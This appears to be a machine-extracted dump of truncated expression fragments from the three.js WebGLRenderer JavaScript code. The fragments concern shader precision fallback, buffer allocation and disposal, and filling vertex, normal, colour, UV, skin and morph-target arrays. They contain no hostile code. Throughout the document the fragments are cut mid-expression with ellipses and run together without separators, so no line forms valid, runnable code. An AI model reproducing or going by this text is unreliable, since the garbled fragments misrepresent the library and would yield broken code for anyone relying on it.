( _p ... }\r\n\r\n\t}_precis ... ailable_precis ... "highp"! highpAvailableif ( me ... \r\n\r\n\t\t}_precis ... diump";_precis ... ediump"mediumpconsole ... ump" );console ... iump" )"WebGLR ... ediump"WebGLRenderer: highp not supported, using mediump_precision = "lowp";_precision = "lowp"lowpconsole ... owp" );console ... lowp" )"WebGLR ... g lowp"WebGLRenderer: highp and mediump not supported, using lowpif ( _p ... ;\r\n\r\n\t}! mediumpAvailableWebGLRenderer: mediump not supported, using lowpthis.getContextreturn _gl;this.su ... \r\n\r\n\t};this.su ... ;\r\n\r\n\t}return  ... xtures;return  ... eFloat;this.su ... vativessupport ... vativesreturn  ... atives;this.su ... ureS3TCsupport ... ureS3TCreturn  ... reS3TC;return  ... otropy;this.getPrecisionreturn _precision;_viewpo ... lRatio;_viewpo ... elRatio_gl.vie ... ight );_gl.vie ... eight )_gl.viewport_gl.sci ... o\r\n\t\t);_gl.sci ... io\r\n\t\t)_gl.scissorthis.en ... \r\n\r\n\t};this.en ... ;\r\n\r\n\t}enable  ... TEST );enable  ... _TEST )_gl.ena ... _TEST )_gl.enable_gl.SCISSOR_TEST_gl.dis ... _TEST )_gl.disable_gl.cle ... lpha );_gl.cle ... Alpha )_gl.clearColorthis.getClearColorreturn _clearColor;this.getClearAlphareturn _clearAlpha;this.cl ... ;\r\n\r\n\t}var bits = 0;bits = 0if ( co ... ER_BIT;color = ... | colorcolor === undefinedbits |= ... ER_BIT;bits |= ... FER_BIT_gl.COLOR_BUFFER_BITif ( de ... ER_BIT;depth = ... | depthdepth === undefined_gl.DEPTH_BUFFER_BITif ( st ... ER_BIT;stencil ... stencilstencil ... defined_gl.STE ... FER_BIT_gl.clear( bits );_gl.clear( bits )_gl.clear_gl.cle ... _BIT );_gl.cle ... R_BIT )this.clearTargetthis.se ... rget );this.se ... arget )this.setRenderTargetthis.cl ... ncil );this.cl ... encil )this.ad ... \r\n\r\n\t};this.ad ... ;\r\n\r\n\t}this.addPostPluginplugin.init( this );plugin.init( this )plugin.initthis.re ... ugin );this.re ... lugin )this.re ... st.pushthis.addPrePluginthis.re ... re.pushthis.up ... \r\n\r\n\t};this.up ... ;\r\n\r\n\t}this.updateShadowMap_curren ... = null;_oldBlending = -1;_oldDepthTest = -1;_oldDepthWrite = -1;_curren ... h = -1;_curren ... sh = -1_curren ... d = -1;_lights ... = true;_oldDou ... d = -1;_oldFlipSided = -1;this.sh ... mera );this.sh ... amera )this.sh ... .updatethis.shadowMapPlugincreateP ... Buffersgeometr ... ffer();geometr ... uffer()geometr ... xBuffer_gl.createBuffer()_gl.createBuffergeometr ... rBuffer_this.i ... ies ++;_this.i ... ries ++_this.i ... metries_this.info.memorygeometr ... eBuffer__webgl ... eBuffergeometr ... lBuffergeometr ... tBuffergeometr ... VBuffergeometr ... 2Buffergeometr ... sBuffer__webgl ... sBuffervar m, ml;geometr ... Buffers__webgl ... Buffersfor ( m ... \n\r\n\t\t\t}m = 0,  ... Targetsml = ge ... Targetsgeometr ... er() );geometr ... fer() )geometr ... rs.pushm = 0,  ... Normalsml = ge ... Normalsvar onG ... \r\n\r\n\t};onGeome ... ;\r\n\r\n\t}var geo ... target;geometr ... .targetgeometr ... pose );geometr ... spose )geometr ... istenerdealloc ... etry );dealloc ... metry )var onT ... \r\n\r\n\t};onTextu ... \n\r\n\r\n\t}var tex ... target;texture ... .targettexture ... pose );texture ... spose )dealloc ... ture );dealloc ... xture )_this.i ... res --;_this.i ... ures --_this.i ... exturesvar onR ... \r\n\r\n\t};onRende ... ;\r\n\r\n\t}onRende ... Disposevar ren ... target;renderT ... .targetrenderT ... pose );renderT ... spose )renderT ... istenerdealloc ... rget );dealloc ... arget )dealloc ... rTargetvar onM ... \r\n\r\n\t};onMater ... ;\r\n\r\n\t}var mat ... target;materia ... .targetmateria ... pose );materia ... spose )materia ... istenerdealloc ... rial );dealloc ... erial )var del ... \r\n\r\n\t};deleteB ... ;\r\n\r\n\t}if ( ge ... ffer );_gl.del ... ffer );_gl.del ... uffer )_gl.deleteBuffergeometr ... tesList__webgl ... tesListvar idgeometr ... .buffergeometr ... t[ id ]_this.i ... ies --;_this.i ... ries --var dea ... \r\n\r\n\t};dealloc ... }\r\n\r\n\t}geometr ... efined;geometry.__webglInitattribu ... .buffergeometr ... yGroupsvar geo ... s[ g ];geometr ... ps[ g ]var m = ... Targets_gl.del ...  m ] );_gl.del ... [ m ] )geometr ... rs[ m ]var m = ... NormalsdeleteB ... roup );deleteB ... Group )deleteB ... etry );deleteB ... metry )texture ... ureCube_gl.del ... Cube );_gl.del ... eCube )_gl.deleteTextureif ( !  ... return;! textu ... bglInittexture.__webglInittexture ...  false;_gl.del ... ture );_gl.del ... xture )if ( !r ... return;!render ... Texture!renderTarget! rende ... TexturerenderT ... TexturerenderT ... getCubeTHREE.W ... getCubeWebGLRe ... getCube_gl.del ...  i ] );_gl.del ... [ i ] )_gl.del ... ebufferrenderT ... er[ i ]renderT ... ebuffer_gl.del ... rbufferrenderT ... rbuffervar pro ... rogram;program ... programif ( pr ... return;program ... definedmateria ... efined;var i,  ... amInfo;var del ...  false;deleteP ... = falseil = _p ... .length_programs.lengthprogram ... s[ i ];program ... ms[ i ]_programs[ i ]if ( pr ... \n\r\n\t\t\t}programInfo.programprogram ... mes --;program ... imes --program ... edTimesif ( pr ... \r\n\t\t\t\t}program ... s === 0deleteP ... = true;deleteProgram = truedeleteP ... == truevar new ... s = [];newPrograms = []newProg ... Info );newProg ... mInfo )newPrograms.push_progra ... ograms;_progra ... rograms_gl.del ... gram );_gl.del ... ogram )_gl.deleteProgram_this.i ... ams --;_this.i ... rams --_this.i ... rogramsvar nve ... length;nvertic ... .lengthgeometr ... t = [];geometr ... st = []var avar att ... s[ a ];attribu ... es[ a ]materia ... es[ a ]if ( !a ... \r\n\t\t\t\t}!attrib ... Buffers!attrib ... ializedattribu ... ializedattribu ... Buffersattribu ... = true;attribu ...  = truevar size = 1;size = 1if ( at ... ze = 3;attribu ... == "v2"size = 2;size = 2attribu ... == "v3"size = 3;size = 3attribu ... == "v4"size = 4;size = 4attribu ... === "c"attribu ... = size;attribu ...  = sizeattribute.sizeattribu ... size );attribu ...  size )new Flo ...  size )nvertices * sizeattribu ... ffer();attribu ... uffer()attribute.bufferattribu ... te = a;attribu ... ute = aattribu ... sUpdategeometr ... bute );geometr ... ibute )geometr ... st.pushgeometr ...  * 3 );geometr ... s * 3 )geometr ... exArraynew Flo ... s * 3 )nvertices * 3geometr ... orArraygeometr ... y = [];geometr ... ay = []geometry.__sortArraygeometr ... rtices;geometr ... leCountinitCus ... ject );initCus ... bject )geometr ...  * 1 );geometr ... s * 1 )geometr ... ceArraynew Flo ... s * 1 )nvertices * 1geometr ... neCountvar geo ... rial );faces3  ... .faces3geometryGroup.faces3nvertic ... gth * 3faces3.length * 3faces3.lengthntris   ... gth * 1faces3.length * 1nlines  ... gth * 3materia ... Group )getBuff ... Group )uvType  ... erial )bufferG ... erial )normalT ... erial )bufferG ... malTypevertexC ... erial )bufferG ... lorTypegeometr ... alArraygeometry.hasTangentsgeometr ...  * 4 );geometr ... s * 4 )geometr ... ntArraynew Flo ... s * 4 )nvertices * 4if ( ve ... \r\n\r\n\t\t}if ( uv ... \r\n\r\n\t\t}geometr ...  * 2 );geometr ... s * 2 )geometr ... uvArraynew Flo ... s * 2 )nvertices * 2geometr ... gth > 1geometr ... v2Arrayobject. ... Weightsobject. ... Indicesgeometr ... htArrayvar Uin ... 6Array;UintArr ... 16Array_glExte ... 16Array_glExte ... > 21845_glExte ... == nullntris > 21845geometr ... tArray;geometr ... peArraynew Uin ... s * 3 )ntris * 3geometr ... neArraynew Uin ... s * 2 )nlines * 2geometr ... ys = []geometr ... sArraysgeometr ...  3 ) );geometr ... * 3 ) )geometr ... ys.pushgeometr ... is * 3;geometr ... ris * 3geometr ... ceCountgeometr ... es * 2;geometr ... nes * 2var ori ... s[ a ];origina ... es[ a ]var attribute = {};attribute = {}var propertyattribu ... erty ];attribu ... perty ]origina ... perty ]if( att ... ze = 3;origina ... = true;origina ...  = trueorigina ... sUpdateattribu ... ribute;attribute.__originalgeometr ... = true;geometr ...  = truegeometr ... dArraysreturn  ... terial;object. ... Index ]geometr ... alIndexreturn  ... hading;materia ... Shading( mater ... aterial( mater ... nvMap )!material.envMapmateria ... erial )return  ... Colors;var namevar buf ... BUFFER;bufferT ... _BUFFER( name  ... _BUFFER( name === "index" )name === "index"_gl.ELE ... _BUFFER_gl.ARRAY_BUFFERvar att ... name ];attribu ...  name ]geometr ...  name ]_gl.bin ... ffer );_gl.bin ... uffer )_gl.bindBuffer_gl.buf ... DRAW );_gl.buf ... _DRAW )_gl.bufferData_gl.STATIC_DRAWvar v,  ... ribute;colors  ... .colorsgeometry.colorscl = colors.lengthcolors.lengthvertexA ... exArraycolorAr ... orArraysortArr ... rtArraydirtyVe ... dUpdategeometr ... dUpdatedirtyEl ... dUpdatedirtyCo ... dUpdatecustomA ... tesList_projSc ... trix );_projSc ... atrix )_projSc ... PS.copy_projSc ... orld );_projSc ... World )_projSc ... ultiplyvertex  ... s[ v ];_vector ... rtex );_vector ... ertex )_vector3.copy_vector ... ixPS );_vector ... rixPS )sortArr ... z, v ];sortArr ... .z, v ]sortArray[ v ][ _vector3.z, v ]sortArr ... Sort );sortArr ... lSort )sortArray.sortvertex  ... ][1] ];vertex  ... v][1] ]vertice ... v][1] ]sortArray[v][1]sortArray[v]offset = v * 3;offset = v * 3vertexA ... rtex.x;vertexA ... ertex.xvertexA ... ffset ]vertexA ... rtex.y;vertexA ... ertex.yvertexA ... t + 1 ]vertexA ... rtex.z;vertexA ... ertex.zvertexA ... t + 2 ]for ( c ... \n\r\n\t\t\t}offset = c * 3;offset = c * 3color = ... ][1] ];color = ... c][1] ]colors[ ... c][1] ]sortArray[c][1]sortArray[c]colorAr ... olor.r;colorAr ... color.rcolorArray[ offset ]colorAr ... olor.g;colorAr ... color.gcolorAr ... t + 1 ]colorAr ... olor.b;colorAr ... color.bcolorAr ... t + 2 ]if ( cu ... \n\r\n\t\t\t}il = cu ... .lengthcustomA ... .lengthcustomA ... s[ i ];customA ... es[ i ]if ( !  ... ntinue;! ( cus ... ices" )( custo ... ices" )customA ... rtices"customA ... definedcustomA ... boundTocal = c ... length;cal = c ... .lengthcustomA ... e.valueif ( cu ... \n\t\t\t\t\t}customA ... e === 1customAttribute.sizefor ( c ... \t\t\t\t\t\t}ca < calca ++ca = 0index = ... ][ 1 ];index = ...  ][ 1 ]sortArray[ ca ][ 1 ]sortArray[ ca ]customA ... ndex ];customA ... index ]customA ... y[ ca ]customA ... e.arraycustomA ... e === 2value = ... ndex ];value = ... index ]customA ... alue.x;customA ... value.xcustomA ... ffset ]value.xcustomA ... alue.y;customA ... value.ycustomA ... t + 1 ]value.yoffset += 2;offset += 2customA ... e === 3if ( cu ... \t\t\t\t\t\t}customA ... === "c"customAttribute.typecustomA ... alue.r;customA ... value.rvalue.rcustomA ... alue.g;customA ... value.gvalue.gcustomA ... alue.b;customA ... value.bcustomA ... t + 2 ]value.boffset += 3;offset += 3customA ... alue.z;customA ... value.zvalue.zcustomA ... e === 4customA ...  + 1  ]customA ...  + 2  ]customA ... alue.w;customA ... value.wcustomA ...  + 3  ]value.wcolor = colors[ c ];color = colors[ c ]colors[ c ]customA ... tices")customA ... sUpdate( custo ... tices")customA ... [ ca ];customA ... e[ ca ]value = ... [ ca ];value = ... e[ ca ]dirtyVe ... rticles_gl.buf ... hint );_gl.buf ...  hint )dirtyCo ... rticlesif ( cu ... \r\n\r\n\t\t}customA ... rticlescustomA ... .bufferlineDis ... stancesgeometr ... stancesdl = li ... .lengthlineDistances.lengthlineDis ... ceArraydirtyLi ... dUpdatefor ( d ... \n\r\n\t\t\t}d < dld ++lineDis ... s[ d ];lineDis ... es[ d ]lineDis ... ay[ d ]lineDistances[ d ]customA ... ices" )if ( !  ... \r\n\r\n\t\t}! geome ... dArraysvar nor ... ding );needsSm ... ading )( norma ... ading )normalT ... Shadingvar f,  ... ormals;vertexIndex = 0offset_uv = 0offset_uv2 = 0offset_face = 0offset_normal = 0offset_tangent = 0offset_line = 0offset_color = 0offset_skin = 0offset_ ... get = 0offset_custom = 0offset_customSrc = 0uvArray ... uvArrayuv2Arra ... v2ArraynormalA ... alArraytangent ... ntArrayskinInd ... exArrayskinWei ... htArraymorphTa ... sArraysmorphNo ... sArraysfaceArr ... ceArraylineArr ... neArraydirtyUv ... dUpdatedirtyNo ... dUpdatedirtyTa ... dUpdatedirtyMo ... dUpdatemorphTa ... dUpdatechunk_f ... .faces3obj_fac ... y.facesobj_uvs ... vs[ 0 ]obj_uvs ... vs[ 1 ]geometr ... vs[ 1 ]obj_col ... .colorsobj_ski ... Indicesobj_ski ... Weightsfl = ch ... .lengthchunk_faces3.lengthface =  ...  f ] ];face =  ... [ f ] ]obj_fac ... [ f ] ]chunk_faces3[ f ]v1 = ve ... ce.a ];v1 = ve ... ace.a ]v2 = ve ... ce.b ];v2 = ve ... ace.b ]v3 = ve ... ce.c ];v3 = ve ... ace.c ]vertexA ... = v1.x;vertexA ...  = v1.xvertexA ... = v1.y;vertexA ...  = v1.yvertexA ... = v1.z;vertexA ...  = v1.zvertexA ... = v2.x;vertexA ...  = v2.xvertexA ... t + 3 ]vertexA ... = v2.y;vertexA ...  = v2.yvertexA ... t + 4 ]vertexA ... = v2.z;vertexA ...  = v2.zvertexA ... t + 5 ]v2.zvertexA ... = v3.x;vertexA ...  = v3.xvertexA ... t + 6 ]vertexA ... = v3.y;vertexA ...  = v3.yvertexA ... t + 7 ]vertexA ... = v3.z;vertexA ...  = v3.zvertexA ... t + 8 ]offset += 9;offset += 9vk < vklvk ++vk = 0, ... .lengthvk = 0vkl = m ... .lengthoffset_ ... et = 0;chf = c ... 3[ f ];chf = c ... s3[ f ]face =  ...  chf ];face =  ... [ chf ]obj_faces[ chf ]v1 = mo ... ce.a ];v1 = mo ... ace.a ]morphTa ... ace.a ]morphTargets[ vk ]v2 = mo ... ce.b ];v2 = mo ... ace.b ]morphTa ... ace.b ]v3 = mo ... ce.c ];v3 = mo ... ace.c ]morphTa ... ace.c ]vka = m ... [ vk ];vka = m ... s[ vk ]morphTa ... s[ vk ]vka[ of ... = v1.x;vka[ of ...  = v1.xvka[ of ... arget ]vka[ of ... = v1.y;vka[ of ...  = v1.yvka[ of ... t + 1 ]offset_ ... get + 1vka[ of ... = v1.z;vka[ of ...  = v1.zvka[ of ... t + 2 ]offset_ ... get + 2vka[ of ... = v2.x;vka[ of ...  = v2.xvka[ of ... t + 3 ]offset_ ... get + 3vka[ of ... = v2.y;vka[ of ...  = v2.yvka[ of ... t + 4 ]offset_ ... get + 4vka[ of ... = v2.z;vka[ of ...  = v2.zvka[ of ... t + 5 ]offset_ ... get + 5vka[ of ... = v3.x;vka[ of ...  = v3.xvka[ of ... t + 6 ]offset_ ... get + 6vka[ of ... = v3.y;vka[ of ...  = v3.yvka[ of ... t + 7 ]offset_ ... get + 7vka[ of ... = v3.z;vka[ of ...  = v3.zvka[ of ... t + 8 ]offset_ ... get + 8faceVer ...  chf ];faceVer ... [ chf ]morphNo ... [ chf ]morphNormals[ vk ]n1 = fa ... mals.a;n1 = fa ... rmals.afaceVertexNormals.an2 = fa ... mals.b;n2 = fa ... rmals.bfaceVertexNormals.bn3 = fa ... mals.c;n3 = fa ... rmals.cfaceVertexNormals.cn1 = mo ...  chf ];n1 = mo ... [ chf ]n2 = n1;n2 = n1n3 = n1;n3 = n1nka = m ... [ vk ];nka = m ... s[ vk ]morphNo ... s[ vk ]nka[ of ... = n1.x;nka[ of ...  = n1.xnka[ of ... arget ]n1.xnka[ of ... = n1.y;nka[ of ...  = n1.ynka[ of ... t + 1 ]n1.ynka[ of ... = n1.z;nka[ of ...  = n1.znka[ of ... t + 2 ]n1.znka[ of ... = n2.x;nka[ of ...  = n2.xnka[ of ... t + 3 ]n2.xnka[ of ... = n2.y;nka[ of ...  = n2.ynka[ of ... t + 4 ]n2.ynka[ of ... = n2.z;nka[ of ...  = n2.znka[ of ... t + 5 ]n2.znka[ of ... = n3.x;nka[ of ...  = n3.xnka[ of ... t + 6 ]n3.xnka[ of ... = n3.y;nka[ of ...  = n3.ynka[ of ... t + 7 ]n3.ynka[ of ... = n3.z;nka[ of ...  = n3.znka[ of ... t + 8 ]n3.zoffset_ ... t += 9;offset_ ... et += 9_gl.bin ... vk ] );_gl.bin ...  vk ] )geometr ... s[ vk ]obj_ski ... .lengthsw1 = o ... ce.a ];sw1 = o ... ace.a ]obj_ski ... ace.a ]sw2 = o ... ce.b ];sw2 = o ... ace.b ]obj_ski ... ace.b ]sw3 = o ... ce.c ];sw3 = o ... ace.c ]obj_ski ... ace.c ]skinWei ...  sw1.x;skinWei ... = sw1.xskinWei ... _skin ]sw1.xskinWei ...  sw1.y;skinWei ... = sw1.yskinWei ... n + 1 ]offset_skin + 1sw1.yskinWei ...  sw1.z;skinWei ... = sw1.zskinWei ... n + 2 ]offset_skin + 2sw1.zskinWei ...  sw1.w;skinWei ... = sw1.wskinWei ... n + 3 ]offset_skin + 3sw1.wskinWei ...  sw2.x;skinWei ... = sw2.xskinWei ... n + 4 ]offset_skin + 4sw2.xskinWei ...  sw2.y;skinWei ... = sw2.yskinWei ... n + 5 ]offset_skin + 5sw2.yskinWei ...  sw2.z;skinWei ... = sw2.zskinWei ... n + 6 ]offset_skin + 6sw2.zskinWei ...  sw2.w;skinWei ... = sw2.wskinWei ... n + 7 ]offset_skin + 7sw2.wskinWei ...  sw3.x;skinWei ... = sw3.xskinWei ... n + 8 ]offset_skin + 8sw3.xskinWei ...  sw3.y;skinWei ... = sw3.yskinWei ... n + 9 ]offset_skin + 9sw3.yskinWei ...  sw3.z;skinWei ... = sw3.zskinWei ...  + 10 ]offset_skin + 10sw3.zskinWei ...  sw3.w;skinWei ... = sw3.wskinWei ...  + 11 ]offset_skin + 11sw3.wsi1 = o ... ce.a ];si1 = o ... ace.a ]si2 = o ... ce.b ];si2 = o ... ace.b ]si3 = o ... ce.c ];si3 = o ... ace.c ]skinInd ...  si1.x;skinInd ... = si1.xskinInd ... _skin ]si1.xskinInd ...  si1.y;skinInd ... = si1.yskinInd ... n + 1 ]si1.yskinInd ...  si1.z;skinInd ... = si1.zskinInd ... n + 2 ]si1.zskinInd ...  si1.w;skinInd ... = si1.wskinInd ... n + 3 ]si1.wskinInd ...  si2.x;skinInd ... = si2.xskinInd ... n + 4 ]si2.xskinInd ...  si2.y;skinInd ... = si2.yskinInd ... n + 5 ]si2.yskinInd ...  si2.z;skinInd ... = si2.zskinInd ... n + 6 ]si2.zskinInd ...  si2.w;skinInd ... = si2.wskinInd ... n + 7 ]si2.wskinInd ...  si3.x;skinInd ... = si3.xskinInd ... n + 8 ]si3.xskinInd ...  si3.y;skinInd ... = si3.yskinInd ... n + 9 ]si3.yskinInd ...  si3.z;skinInd ... = si3.zskinInd ...  + 10 ]si3.zskinInd ...  si3.w;skinInd ... = si3.wskinInd ...  + 11 ]si3.woffset_skin += 12;offset_skin += 12offset_skin > 0dirtyCo ... lorTypevertexC ... Colors;vertexC ... xColorsfaceCol ... .color;faceCol ... e.colorif ( ve ... \r\n\t\t\t\t}vertexC ... h === 3vertexColors.lengthc1 = ve ... s[ 0 ];c1 = ve ... rs[ 0 ]vertexColors[ 0 ]c2 = ve ... s[ 1 ];c2 = ve ... rs[ 1 ]vertexColors[ 1 ]c3 = ve ... s[ 2 ];c3 = ve ... rs[ 2 ]vertexColors[ 2 ]c1 = faceColor;c1 = faceColorc2 = faceColor;c2 = faceColorc3 = faceColor;c3 = faceColorcolorAr ... = c1.r;colorAr ...  = c1.rcolorAr ... color ]c1.rcolorAr ... = c1.g;colorAr ...  = c1.gcolorAr ... r + 1 ]offset_color + 1c1.gcolorAr ... = c1.b;colorAr ...  = c1.bcolorAr ... r + 2 ]offset_color + 2c1.bcolorAr ... = c2.r;colorAr ...  = c2.rcolorAr ... r + 3 ]offset_color + 3c2.rcolorAr ... = c2.g;colorAr ...  = c2.gcolorAr ... r + 4 ]offset_color + 4c2.gcolorAr ... = c2.b;colorAr ...  = c2.bcolorAr ... r + 5 ]offset_color + 5c2.bcolorAr ... = c3.r;colorAr ...  = c3.rcolorAr ... r + 6 ]offset_color + 6c3.rcolorAr ... = c3.g;colorAr ...  = c3.gcolorAr ... r + 7 ]offset_color + 7c3.gcolorAr ... = c3.b;colorAr ...  = c3.bcolorAr ... r + 8 ]offset_color + 8c3.boffset_color += 9;offset_color += 9offset_color > 0dirtyTa ... angentsvertexT ... ngents;vertexT ... angentst1 = ve ... s[ 0 ];t1 = ve ... ts[ 0 ]vertexTangents[ 0 ]t2 = ve ... s[ 1 ];t2 = ve ... ts[ 1 ]vertexTangents[ 1 ]t3 = ve ... s[ 2 ];t3 = ve ... ts[ 2 ]vertexTangents[ 2 ]tangent ... = t1.x;tangent ...  = t1.xtangent ... ngent ]t1.xtangent ... = t1.y;tangent ...  = t1.ytangent ... t + 1 ]offset_tangent + 1t1.ytangent ... = t1.z;tangent ...  = t1.ztangent ... t + 2 ]offset_tangent + 2t1.ztangent ... = t1.w;tangent ...  = t1.wtangent ... t + 3 ]offset_tangent + 3t1.wtangent ... = t2.x;tangent ...  = t2.xtangent ... t + 4 ]offset_tangent + 4t2.xtangent ... = t2.y;tangent ...  = t2.ytangent ... t + 5 ]offset_tangent + 5t2.ytangent ... = t2.z;tangent ...  = t2.ztangent ... t + 6 ]offset_tangent + 6t2.ztangent ... = t2.w;tangent ...  = t2.wtangent ... t + 7 ]offset_tangent + 7t2.wtangent ... = t3.x;tangent ...  = t3.xtangent ... t + 8 ]offset_tangent + 8t3.xtangent ... = t3.y;tangent ...  = t3.ytangent ... t + 9 ]offset_tangent + 9t3.ytangent ... = t3.z;tangent ...  = t3.ztangent ...  + 10 ]offset_tangent + 10t3.ztangent ... = t3.w;tangent ...  = t3.wtangent ...  + 11 ]offset_tangent + 11t3.woffset_ ...  += 12;offset_tangent += 12dirtyNo ... malTypevertexN ... ormals;vertexN ... NormalsfaceNor ... normal;faceNor ... .normalvertexN ... h === 3vertexNormals.lengthvn = ve ... s[ i ];vn = ve ... ls[ i ]vertexNormals[ i ]normalA ... = vn.x;normalA ...  = vn.xnormalA ... ormal ]vn.xnormalA ... = vn.y;normalA ...  = vn.ynormalA ... l + 1 ]offset_normal + 1vn.ynormalA ... = vn.z;normalA ...  = vn.znormalA ... l + 2 ]offset_normal + 2vn.zoffset_normal += 3;offset_normal += 3normalA ... rmal.x;normalA ... ormal.xfaceNormal.xnormalA ... rmal.y;normalA ... ormal.yfaceNormal.ynormalA ... rmal.z;normalA ... ormal.zfaceNormal.zdirtyUv ...  uvTypedirtyUvs && obj_uvsfi = ch ... 3[ f ];fi = ch ... s3[ f ]uv = obj_uvs[ fi ];uv = obj_uvs[ fi ]obj_uvs[ fi ]if ( uv ... ntinue;uvi = uv[ i ];uvi = uv[ i ]uv[ i ]uvArray ...  uvi.x;uvArray ... = uvi.xuvArray[ offset_uv ]uvi.xuvArray ...  uvi.y;uvArray ... = uvi.yuvArray ... v + 1 ]offset_uv + 1uvi.yoffset_uv += 2;offset_uv += 2offset_uv > 0dirtyUvs && obj_uvs2uv2 = o ... [ fi ];uv2 = obj_uvs2[ fi ]obj_uvs2[ fi ]uv2 === undefineduv2i = uv2[ i ];uv2i = uv2[ i ]uv2[ i ]uv2Arra ... uv2i.x;uv2Arra ...  uv2i.xuv2Arra ... t_uv2 ]uv2i.xuv2Arra ... uv2i.y;uv2Arra ...  uv2i.yuv2Arra ... 2 + 1 ]offset_uv2 + 1uv2i.yoffset_uv2 += 2;offset_uv2 += 2offset_uv2 > 0faceArr ... xIndex;faceArr ... exIndexfaceArr ... _face ]faceArr ... ex + 1;faceArr ... dex + 1faceArr ... e + 1 ]offset_face + 1vertexIndex + 1faceArr ... ex + 2;faceArr ... dex + 2faceArr ... e + 2 ]offset_face + 2vertexIndex + 2offset_face += 3;offset_face += 3lineArr ... xIndex;lineArr ... exIndexlineArr ... _line ]lineArr ... ex + 1;lineArr ... dex + 1lineArr ... e + 1 ]offset_line + 1lineArr ... e + 2 ]offset_line + 2lineArr ... ex + 2;lineArr ... dex + 2lineArr ... e + 3 ]offset_line + 3lineArr ... e + 4 ]offset_line + 4lineArr ... e + 5 ]offset_line + 5offset_line += 6;offset_line += 6vertexIndex += 3;vertexIndex += 3! custo ... sUpdatecustomA ... riginaloffset_custom = 0;offset_ ... rc = 0;for ( f ... \t\t\t\t\t\t}customA ... ce.a ];customA ... ace.a ]customA ... ustom ]customA ... ce.b ];customA ... ace.b ]customA ... m + 1 ]offset_custom + 1customA ... ce.c ];customA ... ace.c ]customA ... m + 2 ]offset_custom + 2offset_custom += 3;offset_custom += 3customA ... "faces"value = ...  f ] ];value = ... [ f ] ]customA ... [ f ] ]customA ...  value;customA ... = valuev1 = cu ... ce.a ];v1 = cu ... ace.a ]v2 = cu ... ce.b ];v2 = cu ... ace.b ]v3 = cu ... ce.c ];v3 = cu ... ace.c ]customA ... = v1.x;customA ...  = v1.xcustomA ... = v1.y;customA ...  = v1.ycustomA ... = v2.x;customA ...  = v2.xcustomA ... = v2.y;customA ...  = v2.ycustomA ... m + 3 ]offset_custom + 3customA ... = v3.x;customA ...  = v3.xcustomA ... m + 4 ]offset_custom + 4customA ... = v3.y;customA ...  = v3.ycustomA ... m + 5 ]offset_custom + 5offset_custom += 6;offset_custom += 6v1 = value;v1 = valuev2 = value;v2 = valuev3 = value;v3 = valuevar pp;pp = [  ...  "b" ];pp = [  ... , "b" ][ "r", "g", "b" ]pp = [  ...  "z" ];pp = [  ... , "z" ][ "x", "y", "z" ]customA ...  0 ] ];customA ... [ 0 ] ]v1[ pp[ 0 ] ]pp[ 0 ]customA ...  1 ] ];customA ... [ 1 ] ]v1[ pp[ 1 ] ]pp[ 1 ]customA ...  2 ] ];customA ... [ 2 ] ]v1[ pp[ 2 ] ]pp[ 2 ]v2[ pp[ 0 ] ]v2[ pp[ 1 ] ]v2[ pp[ 2 ] ]customA ... m + 6 ]offset_custom + 6v3[ pp[ 0 ] ]customA ... m + 7 ]offset_custom + 7v3[ pp[ 1 ] ]customA ... m + 8 ]offset_custom + 8v3[ pp[ 2 ] ]offset_custom += 9;offset_custom += 9v1 = value[ 0 ];v1 = value[ 0 ]value[ 0 ]v2 = value[ 1 ];v2 = value[ 1 ]value[ 1 ]v3 = value[ 2 ];v3 = value[ 2 ]value[ 2 ]customA ... stom  ]customA ... = v1.z;customA ...  = v1.zcustomA ... = v1.w;customA ...  = v1.wv1.wcustomA ...  + 4  ]customA ...  + 5  ]customA ... = v2.z;customA ...  = v2.zcustomA ...  + 6  ]customA ... = v2.w;customA ...  = v2.wcustomA ...  + 7  ]v2.wcustomA ...  + 8  ]customA ...  + 9  ]offset_custom + 9customA ... = v3.z;customA ...  = v3.zcustomA ...  + 10 ]offset_custom + 10customA ... = v3.w;customA ...  = v3.wcustomA ...  + 11 ]offset_custom + 11v3.woffset_custom += 12;offset_custom += 12delete  ... Arrays;delete  ... dArraysdelete  ... rArray;delete  ... orArraydelete  ... lArray;delete  ... alArraydelete  ... tArray;delete  ... ntArraydelete  ... vArray;delete  ... uvArraydelete  ... 2Array;delete  ... v2Arraydelete  ... eArray;delete  ... ceArraydelete  ... xArray;delete  ... exArraydelete  ... neArraydelete  ... htArrayvar att ... teItem;for ( a ... \r\n\r\n\t\t}attribu ... Name ];attribu ... eName ]if ( at ... \n\r\n\t\t\t}attribu ... 'index'attributeItem.bufferattributeItem.arrayattribu ...  false;this.re ... mediaterenderB ... mediateinitAttributes();initAttributes()if ( ob ... ffer();object. ... xBufferobject.hasPositions! objec ... xBufferobject. ... ffer();object. ... uffer()object. ... lBufferobject.hasNormals! objec ... lBufferobject. ... vBufferobject.hasUvs! objec ... vBufferobject. ... rBufferobject.hasColors! objec ... rBufferobject.positionArray_gl.DYNAMIC_DRAWenableA ... tion );enableA ... ition )program ... ositionprogram.attributes_gl.ver ... 0, 0 );_gl.ver ...  0, 0 )_gl.ver ... Pointer_gl.FLOATvar nx, ... nt * 3;il = ob ... unt * 3object.count * 3object.countfor( i  ... \r\n\t\t\t\t}normalA ... lArray;object.normalArraynax  =  ... y[ i ];nax  =  ... ay[ i ]normalArray[ i ]nay  =  ...  + 1 ];nay  =  ... i + 1 ]normalArray[ i + 1 ]naz  =  ...  + 2 ];naz  =  ... i + 2 ]normalArray[ i + 2 ]nbx  =  ...  + 3 ];nbx  =  ... i + 3 ]normalArray[ i + 3 ]nby  =  ...  + 4 ];nby  =  ... i + 4 ]normalArray[ i + 4 ]nbz  =  ...  + 5 ];nbz  =  ... i + 5 ]normalArray[ i + 5 ]ncx  =  ...  + 6 ];ncx  =  ... i + 6 ]normalArray[ i + 6 ]ncy  =  ...  + 7 ];ncy  =  ... i + 7 ]normalArray[ i + 7 ]ncz  =  ...  + 8 ];ncz  =  ... i + 8 ]normalArray[ i + 8 ]nx = (  ...  ) / 3;nx = (  ... x ) / 3( nax + ... x ) / 3( nax + nbx + ncx )nax + nbx + ncxnax + nbxny = (  ...  ) / 3;ny = (  ... y ) / 3( nay + ... y ) / 3( nay + nby + ncy )nay + nby + ncynay + nbynz = (  ...  ) / 3;nz = (  ... z ) / 3( naz + ... z ) / 3( naz + nbz + ncz )naz + nbz + ncznaz + nbznormalA ...   = nx;normalA ...    = nxnormalA ... ] = ny;normalA ...  ] = nynormalA ... ] = nz;normalA ...  ] = nznormalA ... ] = nx;normalA ...  ] = nxenableA ... rmal );enableA ... ormal )program ... .normalobject. ... ial.mapobject.uvArrayenableA ... s.uv );enableA ... es.uv )program ... 